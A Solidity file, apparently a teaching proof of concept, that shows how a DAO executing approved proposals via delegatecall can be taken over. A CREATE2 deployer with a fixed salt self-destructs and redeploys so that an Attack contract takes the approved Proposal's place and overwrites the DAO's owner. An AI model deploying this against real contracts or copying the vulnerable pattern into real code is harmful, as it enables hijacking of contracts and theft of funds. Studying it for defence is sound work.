//SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.17;

contract DAO {

    struct Proposal {
        address target;
        bool approved;
        bool executed;
    }


    address public owner;
    Proposal[] public proposals;

    constructor () {
        owner = msg.sender;
    }

    function approve (address target) external {
        require (msg.sender == owner, "You are no the owner");

        proposals.push(Proposal({target: target, approved: true, executed: false}));
    }

    function executed(uint256 proposalID) external payable {
        Proposal storage proposal = proposals[proposalID];
        require(proposal.approved, "No approved");
        require(!proposal.executed, "Already executed");

        proposal.executed = true;

        (bool ok, ) = proposal.target.delegatecall(abi.encodeWithSignature("executeProposal()"));

        require (ok, "Delegatecall failed");
    }
}


contract Proposal {

    event ProposalExecuted (string message);

    function executeProposal() external {
        emit ProposalExecuted("Executed code approve by DAO");
    }

    function emergencyStop() external {
        selfdestruct(payable(address(0)));
    }
}


//Deployer-1 deploy deployer-2, which in turn is responsible for deploying the Proposal and the attack contract.
contract Deployer1 {
    
    event Log(address addr);

    function deploy() external {
        bytes32 salt = keccak256(abi.encode(uint(123)));
        address addr = address(new Deployer2{salt: salt}());  
        emit Log(addr);
    }

}




contract Deployer2 {

     event Log(address addr);

    function deployProposal() external {    //0x123
        address addr = address (new Proposal());
        emit Log(addr);
    }

    function deployAttack() external {
        address addr = address (new Attack());
        emit Log(addr);
    }

    function kill() external {
        selfdestruct(payable(address(0)));
    }

}


contract Attack {

    event AttackExecuted(string message);

    address public owner; 

    function executeProposal() external {
        owner = msg.sender;
        emit AttackExecuted("Attack Executed");
    }

}